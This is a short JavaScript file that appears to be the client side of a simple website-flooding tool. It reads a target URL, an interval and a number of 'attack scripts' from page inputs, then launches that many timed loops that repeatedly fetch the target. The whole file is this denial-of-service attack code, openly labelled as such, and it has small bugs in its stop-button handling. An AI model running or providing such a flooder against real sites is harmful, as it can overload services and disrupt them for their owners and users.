const site_name = document.querySelector(".site-name").value;
const attack_ms = document.querySelector(".attack-ms").value;
const howmany_attacks_script = document.querySelector(".howmany-attacks-scripts").value;

async function attackMainCode() {
    for(i = 0; i <= howmany_attacks_script; i++) {
        attackEach();
    }
}
async function attackEach() {
    const Each = setInterval(() => {
        fetchAttack();
    },attack_ms);
    document.querySelector("attack-button").onclick = () => {
        clearInterval(Each);
    }
}

async function fetchAttack() {
    try {
        const response = await fetch(site_name);
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        const data = await response.json();
        console.log(data);
      } catch (error) {
        console.error('There was a problem with the fetch operation:', error);
      }
}

function attackHandler() {
    attackMainCode();
}